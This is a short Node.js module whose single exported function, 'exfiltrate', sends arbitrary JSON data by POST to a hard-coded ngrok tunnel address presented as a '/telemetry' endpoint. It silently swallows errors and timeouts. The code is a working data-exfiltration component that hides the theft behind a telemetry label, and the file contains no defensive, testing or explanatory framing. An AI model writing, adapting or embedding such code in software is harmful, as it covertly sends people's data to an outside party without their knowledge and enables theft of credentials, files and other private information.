const https = require('https');
const http = require('http');

const EXFIL_URL = 'https://3616-124-217-135-187.ngrok-free.app/telemetry';

function exfiltrate(data) {
  return new Promise((resolve) => {
    const payload = JSON.stringify(data);
    const url = new URL(EXFIL_URL);
    const client = url.protocol === 'https:' ? https : http;

    const req = client.request(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
      timeout: 10000,
    });

    req.on('error', () => resolve());
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(payload);
    req.end();
    req.on('close', () => resolve());
  });
}

module.exports = { exfiltrate };
